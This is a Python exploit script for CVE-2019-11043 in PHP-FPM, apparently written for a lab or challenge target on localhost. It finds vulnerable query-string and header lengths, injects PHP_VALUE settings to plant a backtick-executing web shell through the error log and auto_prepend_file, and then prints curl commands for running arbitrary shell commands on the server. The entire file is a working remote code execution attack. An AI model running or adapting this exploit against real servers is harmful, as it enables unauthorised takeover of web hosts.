import requests, argparse, sys, time


target = "http://localhost:11043/index.php"

hash_strndup="Ebut" 
header_value = "tudda nwsec" # qazxs edcvf

http_header = {
    "User-Agent":"CVE-2019-11043",
    "TUD":"A", 
    "Ebut":"tudda nwsec" # hash_strndup hash collision with PHP_VALUE when appended to HTTP_*
}

php_settings = [
	"short_open_tag=1;;;;;;;", # Open short php tab 
	"html_errors=0;;;;;;;;;;", # Turn off HTML tag in the eror message
	"include_path=/tmp;;;;;;", # Include Path
	"auto_prepend_file=a;;;;", # Specifies the files that are automatically included before the script executes, similar to require().
	"log_errors=1;;;;;;;;;;;", # Enable error logging
	"error_reporting=2;;;;;;", # Sepcify error level
	"error_log=/tmp/a;;;;;;;", # Error logging file
	"extension_dir=%22%3C%3F=%60%22;;;", # Specify the load directory for the extension
	"extension=%22$_GET%5Ba%5D%60%3F%3E%22", # Specify the extension to load
]

postfix = "TUD"

remote_command = "a=/bin/sh+-c+'which+which'" # The command that should be executed remotely
remote_test = "bin/which" # Check if RCE is working

query_string_length = [] # Query String Length
header_value_length = 1 # Header Value Length

def repeat_to_length(input, desiredLength):
    return (input * (desiredLength//len(input) + 1))[:desiredLength]

def get_QSL_candidates():
    print("‚ùîRequesting target to find qsl candidates.")
    for x in range(1500,1950):
        res = requests.get(target+ "/PHP%0ABonusChallengeExploits.php?"+(repeat_to_length(postfix, x-2) ), headers=http_header)
        if res.status_code == 502:
            print("\t[Response] Status sode is {} for QSL {}. Meets criteria and added as candidate".format(res.status_code, x))
            query_string_length.append(x)
    if len(query_string_length) == 0:
        print("‚ùå There has been no candidate found. Server not vulnerable or query string length did not meet requirements.")
        sys.exit()
    # Post process qsl candidates to get all candidates
    qsl_candidate_extend = []
    for qsl in query_string_length:
        qsl_extend = [qsl-10,qsl-5,qsl]
        qsl_candidate_extend.extend(qsl_extend)
    qsl_list = list(set(qsl_candidate_extend))
    qsl_list.sort()
    print("\tPost processed QSL candidate(s): {}".format(", ".join(str(x) for x in qsl_list)))
    return qsl_list



def test_QSL_candidates(candidates, header_value_length):
    print("‚öôÔ∏è Testing found candidates")
    r = True
    # Set session.auto_start=1 and find PisosLength (length of cookie[D-Pisos])
    # 
    # %0A for newline \n <LF>
    for candidate in candidates:
        print("\t[Test] QSL Candidate: ", candidate)
        while r:
            #A djust the length of 'TUD' Header to exactly overwrite the HTTP_EBUT and set its value to PHP_VALUE\nsession.auto_start=1;;;. 
            res = requests.get(
                target+"/PHP_VALUE%0Asession.auto_start=1;;;?"+(repeat_to_length(postfix, candidate-2)),
                headers={
                    "User-Agent":"CVE-2019-11043",
                    "TUD":("A"*header_value_length),
                    hash_strndup:header_value
                }
            )

            # If 'Set-Cookie' in HTTP response header is set, we know that the target is vulnerable and our exploit succeeds
            if "Set-Cookie" in res.headers and "PHPSESSID" in res.headers["Set-Cookie"]:
                print("üí£ Target seems vulnerable with attack parameters: (QSL:{}/HVL:{}): {}".format(
                    str(candidate),
                    str(header_value_length),
                    res.headers["Set-Cookie"]
                ))

                session_hvl = header_value_length
                session_qsl = candidate
                r = False
                break
            
            header_value_length = (header_value_length+1)

            if header_value_length > 556:
                header_value_length = 1
                break

        if r is False:
            break

    try:
        session_hvl
        return True, session_hvl
    except:
        print("Target not vulnerable or something goes wrong...")
        return False, 0

########
########
########

print("üöÄüöÄüöÄ Starting...")
qsl_candidates = get_QSL_candidates()
isVulnerable, session_hvl = test_QSL_candidates(qsl_candidates, header_value_length)

if isVulnerable:

    # Trying to set session.auto_start=0
    for candidate in qsl_candidates:
        res = requests.get(target+"/PHP_VALUE%0Asession.auto_start=0;;;?"+(repeat_to_length(postfix, candidate-2)), headers={"User-Agent":"CVE-2019-11043","TUD":("A"*session_hvl), hash_strndup:header_value})

    for zz in range(qsl_candidates[0],(qsl_candidates[-1])):
        # Utilizing the RCE chain by using php.ini settings
        for setting in php_settings:
            intremove = (len(setting)+4)
            res = requests.get(target+"/PHP_VALUE%0A"+setting+"?"+remote_command+"&"+(repeat_to_length(postfix, zz-intremove-2)), headers={"User-Agent":"CVE-2019-11043","TUD":("A"*session_hvl), hash_strndup:header_value})
            time.sleep(0.5)

            if remote_test in res.text:
                print(
                    "‚úÖ Success: Remote Code Execution exploit successfully deployed!\n\n"+\
                    "You should be able to run commands using:\n"+\
                    "\tüåç curl "+target+"?a=bin/ls+/\n"+\
                    "\tor\n"+\
                    "\tüåç curl "+target+"?a=%0asleep+5%0a+/\n"
                )
                sys.exit()

    for i in range(0,2):
        res = requests.get(target+"?a=usr/bin/which+which")
        if remote_test in res.text:
            print(
                "‚úÖ Success: Remote Code Execution successfully exploited!\n\n"+\
                "You should be able to run commands using:\n"+\
                "\tcurl "+target+"?a=bin/ls+/\n"+\
                "\tor\n"+\
                "\tcurl "+target+"?a=%0asleep+5%0a+/\n"
            )
            sys.exit()
